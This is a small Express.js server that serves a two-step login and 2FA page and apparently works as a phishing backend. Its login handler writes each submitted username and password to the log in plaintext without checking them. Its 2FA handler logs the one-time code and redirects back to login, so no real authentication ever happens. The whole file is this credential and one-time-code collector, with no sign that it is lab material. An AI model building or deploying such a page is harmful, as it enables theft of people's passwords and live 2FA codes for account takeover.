// Express webserver

const express = require('express');


const app = express();
app.use(express.urlencoded({ extended: false }));

app.get('/', (req, res) => {
  res.redirect('/login?next=/');
});

app.get('/static/styles.css', (req, res) => {
  const css = ".error {\n  color: red;\n  margin-bottom: 5px;\n  text-align: center;\n}\n\na {\n  text-decoration: none;\n}";
  res.send(css);
})

app.get('/login', (req, res) => {
  const next = req.query.next || '/';
  console.log(`Login requested with next=${next}`);
  res.sendFile(__dirname + '/step1.html');
});

app.get('/verify-2fa', (req, res) => {
  console.log(`2FA Request`);
  res.sendFile(__dirname + '/step2.html');
});

app.post('/login', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;
  console.log(`Login attempt with username = ${username} and password = ${password}`);
  res.redirect("/verify-2fa");
});

app.post('/verify-2fa', (req, res) => {
  const otp = req.body.otp;
  console.log(`2FA verification with otp = ${otp}`);
  res.redirect('/login');
});

app.listen(1234, () => {
    console.log('Listening on port 1234');
});